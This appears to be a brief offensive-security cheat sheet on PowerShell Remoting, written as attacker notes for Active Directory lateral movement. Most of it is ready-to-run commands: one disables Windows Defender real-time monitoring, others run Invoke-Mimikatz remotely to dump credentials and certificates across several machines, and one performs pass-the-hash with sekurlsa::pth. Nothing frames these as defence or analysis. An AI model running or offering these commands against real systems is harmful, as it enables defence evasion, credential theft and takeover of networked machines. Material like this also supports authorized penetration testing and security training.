# Powershell Remoting

* Enabled by default from Windows Server 2012
* Admin privileges are required to connect

## One to One
* Uses PSSession
  * Interactive, stateful session
  * Run in a new process `wsmprovhost`

## Useful cmdlets
New-PSSession
Enter-PSSession

```
Set-MpPreference -DisableRealtimeMonitoring $true
New-PSSession -ComputerName instance

$sess = New-PSSession -ComputerName instance
Enter-PSSEssion - Session $sess
```
## One to Many (Fan-out Remoting)

* Non-interactive
* Parallel command execution
* Can execute scripts from files
* Usable to perform command execution without dropping exe onto disk
* Useful for passing and replying hashes, tickets and other AD attacks

Run commands:
```
Invoke-Command -ScriptBlock{whoami;hostname} -ComputerName instance
```

Run scripts:
```
Invoke-Command -FilePath example.ps1 -ComputerName instance
```

Run functions installed on the remote box:
```
Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -ComputerName instance
```

Stateful commands:
```
$sess = New-PSSession -ComputerName instance
Invoke-Command -Session $sess -ScriptBlock {$proc = Get-Process}
Invoke-Command -Session $sess -ScriptBlock {$proc.Name}
```

Mimikatz (ReflectivePEInjection is used to load into memory)
```
Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -DumpCerts
```

Pass the Hash
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<name_of_the_user> /domain:. /ntlm:<ntlmhash> /run:powershell.exe"'
```
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator  /domain:. /ntlm:<ntlmhash> /run:powershell.exe"'
```

Dump Creds from multiple machines
```
Invoke-Mimikatz -DumpCreds -ComputerName @("instance1", "instance2")
```
